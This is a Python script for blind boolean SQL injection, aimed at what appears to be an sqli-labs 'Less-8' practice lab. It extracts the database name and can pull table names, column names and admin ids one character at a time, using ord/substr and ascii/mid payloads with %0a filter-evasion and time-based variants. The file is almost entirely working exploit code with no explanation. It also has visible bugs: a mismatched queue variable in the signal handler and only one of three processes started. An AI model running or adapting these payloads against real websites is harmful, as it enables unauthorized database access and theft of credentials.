import requests
import sys
import signal
from rich.console import Console
from prettytable import PrettyTable
from multiprocessing import Process, Queue
from os import system


def clear():
    system('cls')


def CtrlC(qr1,qr2):
    clear()
    for i in range(1, 30):
        if q2.empty():
            break
        else:
            name = q2.get()
    table = PrettyTable(
        ['The resulting data'])
    table.align = 'l'
    row = [name]
    table.add_row(row)
    print(table)
    sys.exit()


def generate(q):
    for i in range(1, 30):
        for j in range(33, 127):
            q.put(j)


def booler_injection(url, q, q2):
    console = Console()
    name = ''
    for i in range(1, 30):
        while True:
            j = q.get()
            j = (128 + 31) - j
            py_dict = {
                'str1': "and ord(substr((select database()),{0},1))={1} -- +'",
                'str2': '''if(ascii(mid((select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema%0alike%0adatabase()),{0},1))%0alike%0a{1},5,0)''',
                'str3': '''if(ascii(mid((select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name%0alike%0a0x61646D696E),{0},1))%0alike%0a{1},5,0)''',
                'str4': '''if(ascii(mid((select%0agroup_concat(id)%0afrom%0ahs_test_s1_blog.admin),{0},1))%0alike%0a{1},5,0)'''
            }
            payload_str = py_dict['str1'].format(i, j)
            pld = url + payload_str
            req1 = requests.get(pld)
            print(pld, end='\r')
            if req1.text.find('You are in') > 0:
                name += chr(j)
                clear()
                console.print("[green][+]data is -> [/green]" + name)
                q2.put(name)
                break



if __name__ == '__main__':
    try:
        q2 = Queue()
        q = Queue()
        signal.signal(signal.SIGINT, CtrlC)
        signal.signal(signal.SIGTERM, CtrlC)
        url = "http://ed20b0fed9df4576870cff233249cf9a.app.mituan.zone/Less-8/?id=1'"
        generate(q)
        for i in range(3):
            p1: Process = Process(target=booler_injection, args=(url, q, q2,))
        p1.start()
    except Exception as ex:
        print(ex)
